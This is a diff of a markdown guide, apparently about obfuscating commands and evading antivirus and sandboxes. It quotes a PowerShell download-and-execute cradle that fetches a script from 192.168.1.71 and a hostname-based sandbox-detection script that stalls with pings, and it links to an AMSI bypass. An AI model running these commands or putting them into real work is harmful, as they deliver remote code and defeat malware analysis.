@@ -443,7 +443,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
 
 ![pipe commands](http://i.cubeupload.com/McTrjq.jpg)
 
-      Using the delimiter remove technic into one cradle downloader (powershell)
+      Using the delimiter remove technic into one cradle downloader (powershell or batch)
 
 - String command to obfuscate<br />
 `cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/hello.ps1')`
@@ -1286,7 +1286,7 @@ there is a tool [AVSignSeek](https://github.com/hegusung/AVSignSeek) that can he
 
 [sandbox-detection.ps1 demo script can be found here:](https://pastebin.com/qhgDvcrF)<br />
 
-      The next example uses 'stalling+Onset delay' technics to bypass the sandbox environment.
+      Next example uses 'stalling + Onset delay' technics to bypass the sandbox environment.
       Onset delay: Malware will delay execution to avoid analysis by the sample.
       For example, a external Ping can be perform during a pre-defined time. 
 
@@ -1297,7 +1297,9 @@ there is a tool [AVSignSeek](https://github.com/hegusung/AVSignSeek) that can he
 
 <br />
 
-      $h=hostname;if ($h -match "Sandbox" -Or $h -match "Maltest" -Or $h -match "Malware" -Or $h -match "ClonePC") {write-Host "";write-Host "SandBox : detected .." -ForeGroundColor red;write-Host "Hostname: $h" -ForeGroundColor red;ping -n 6 -w 100 www.microsoft.com;echo Microsoft > %tmp%\\License.pem;ping -n 3 -w 100 www.microsoft.org;powershell Get-Date;Start-Sleep 3}else{write-Host "";write-Host "SandBox : not detected .." -ForeGroundColor green;write-Host "Hostname: $h" -ForeGroundColor green;powershell Get-Date;Start-Sleep 3}
+      $h=hostname;if ($h -match "Sandbox" -Or $h -match "Maltest" -Or $h -match "Malware" -Or $h -match "ClonePC") {write-Host "";write-Host "SandBox : detected .." -ForeGroundColor red;write-Host "Hostname: $h" -ForeGroundColor red;ping -n 6 -w 100 www.microsoft.com > $env:tmp\license.pem;powershell Get-Date;Start-Sleep 3}else{write-Host "";write-Host "SandBox : not detected .." -ForeGroundColor green;write-Host "Hostname: $h" -ForeGroundColor green;powershell Get-Date;Start-Sleep 3}
+
+![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/TO8qsd.jpg)
 
 ---
 
